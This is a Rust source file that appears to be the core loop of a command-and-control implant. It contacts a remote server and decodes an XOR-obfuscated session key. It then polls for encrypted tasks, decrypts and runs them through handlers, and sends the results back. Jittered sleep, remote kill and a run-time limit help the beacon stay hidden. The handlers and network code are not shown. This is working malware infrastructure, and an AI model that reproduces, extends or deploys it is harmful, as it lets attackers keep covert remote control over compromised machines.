use serde::{Serialize, Deserialize};
use chrono::{DateTime, Duration, Utc};
use crate::internal::config::C;
use crate::internal::{http, config, crypto};
use crate::internal::crypto::xor_bytes_to_string;
use std::{thread, time};
use rand::{Rng};
use std::collections::HashMap;
use crate::internal::tasks;

#[derive(PartialEq, Debug)]
pub struct Listener {
    pub id: String,
    pub key: String,
    pub started_at: DateTime<Utc>,
    pub initiated: bool,
    pub registered: bool,
    pub(crate) config: C
}

#[derive(Serialize, Deserialize, PartialEq, Debug)]
pub struct Task {
    pub command: String,
    pub listener_id: String,
    pub args: Vec<String>
}

pub trait TaskHandler {
    fn handle(&self, listener_id: String, args: Vec<String>) -> Result<String, Box<dyn std::error::Error>>;
}

impl Task {
    pub fn new(listener_id: String, key: String, encrypted: String) -> Task {
        let input = crypto::decrypt_data(encrypted, key.as_bytes());
        let parsed_input = shellwords::split(input.as_str());
        let command_with_args= parsed_input.unwrap();

        return match command_with_args.len() {
            0 => Task::empty(listener_id),
            1 => Task { listener_id, command: command_with_args.first().unwrap().to_ascii_lowercase(), args: vec!() },
            _ => Task { listener_id, command: command_with_args.first().unwrap().to_ascii_lowercase(), args: command_with_args[1..].to_vec() }
        };
    }

    pub fn empty(listener_id: String) -> Task {
        return Task { listener_id, command: "".to_string(), args: vec!() };
    }

    pub fn from_response(listener_id: String, key: String, response: HashMap<String,String>) -> Task {
        let encrypted = match response.get("task") {
            Some(v) => v,
            None => ""
        };

        return Task::new(listener_id, key, encrypted.to_string())
    }

    pub async fn run(&self) -> Result<String, Box<dyn std::error::Error>> {
        if self.command.is_empty() {
            return Ok("".to_string())
        }

        let handlers = tasks::handlers();
        let result: String = match handlers.get(self.command.as_str()) {
            None => "".to_string(),
            Some(h) => match h.handle(self.listener_id.clone(), self.args.clone()) {
                Ok(r) => r,
                Err(e) => format!("[ERROR] There was unexpected an error while running the task: {:?}", e),
            }
        };

        Ok(result)
    }
}

impl Listener {
    pub async fn new() -> Result<Listener, Box<dyn std::error::Error>>  {
        let data = http::initiate().await?;

        let decoded = base64::decode(data.get("k").unwrap().as_str())?;

        let listener = Listener {
            id: data.get("id").unwrap().to_string(),
            key: xor_bytes_to_string(&decoded, config::get_xor_key()),
            config: config::get(),
            started_at: Utc::now(),
            initiated: true,
            registered: false,
        };

        Ok(listener)
    }

    pub fn can_run(&self) -> bool {
        let run_until = self.started_at.checked_add_signed(Duration::hours(self.config.n.kt.clone().into())).unwrap();

        return run_until > Utc::now();
    }

    pub async fn sleep(&self) -> Result<(), Box<dyn std::error::Error>> {
        let sleep_duration = calculate_sleep_duration(self.config.n.st, self.config.n.sj);
        let sleep_time = time::Duration::from_secs(sleep_duration);

        #[cfg(any(feature = "debug_assertions", feature = "debug"))]
        println!("DEBUG: Sleeping for {} seconds.", sleep_time.clone().as_secs());

        thread::sleep(sleep_time);

        Ok(())
    }

    pub fn ready(&self) -> bool {
        return self.initiated && self.registered
    }

    pub async fn register(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let _ = http::register(self.id.clone(),self.key.clone()).await?;

        self.registered = true;

        Ok(())
    }

    pub async fn work(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let task = self.get_task().await?;

        let result: String = match task.command.as_str() {
            "" => "".to_string(),
            "kill" => self.quit().await?,
            "sleep" => self.update_sleep(task).await?,
            _ => task.run().await?
        };

        if ! result.is_empty() {
            self.send_result(result).await?;
        }

        return Ok(())
    }

    async fn get_task(&self) -> Result<Task, Box<dyn std::error::Error>> {
        let response = http::get_task(self.id.clone()).await?;
        let task = Task::from_response(self.id.clone(), self.key.clone(), response);

        if task.command.is_empty() {
            Ok(Task::empty(self.id.clone()))
        } else {
            Ok(task)
        }
    }

    async fn send_result(&self, result: String) -> Result<(), Box<dyn std::error::Error>> {
        let _ = http::send_result(self.id.clone(),self.key.clone(), result).await?;

        Ok(())
    }

    async fn update_sleep(&mut self, task: Task) -> Result<String, Box<dyn std::error::Error>> {
        self.config.n.st = match task.args.len() {
            1 | 2 => task.args.first().unwrap().parse::<u32>().unwrap(),
            _ => self.config.n.st
        };

        self.config.n.sj = match task.args.len() {
            2 => task.args.get(1).unwrap().parse::<f64>().unwrap(),
            _ => self.config.n.sj
        };

        Ok(format!("Sleep time changed to {} seconds ({}% jitter)", self.config.n.st.clone(), self.config.n.sj.clone()).to_string())
    }

    async fn quit(&self) -> Result<String, Box<dyn std::error::Error>> {
        std::process::exit(0)
    }
}

fn calculate_sleep_duration(st: u32, sj: f64) -> u64 {
    let mut rng = rand::thread_rng();
    let mut jitter = sj;

    if sj < 0.0 {
        jitter = 0.0
    }

    if sj > 100.0 {
        jitter = 100.0
    }

    let padding: f64 = st.clone() as f64 * jitter / 100.0;
    let lower_bound = st.clone() as f64 - padding;
    let upper_bound = st.clone() as f64 + padding;

    let sleep_duration: f64 = if lower_bound >= upper_bound {
        st as f64
    } else {
        rng.gen_range(lower_bound..upper_bound)
    };

    return sleep_duration.round() as u64
}